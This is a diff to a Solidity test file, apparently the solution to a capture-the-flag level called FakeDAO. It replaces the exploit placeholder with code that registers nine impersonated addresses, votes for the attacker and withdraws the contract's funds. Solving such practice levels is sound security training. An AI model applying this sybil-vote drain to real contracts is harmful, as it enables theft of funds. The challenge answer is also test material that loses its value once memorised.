@@ -10,13 +10,18 @@ contract FakeDAOTest is BaseTest {
 
     function setUp() public override {
         super.setUp();
-
         instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        for (uint256 i = 1; i < 10; i++) {
+            address newUser = address(uint160(i));
+            vm.prank(newUser);
+            instance.register();
+        }
+        instance.register(); 
+        instance.voteForYourself();
+        instance.withdraw();
         checkSuccess();
     }
 
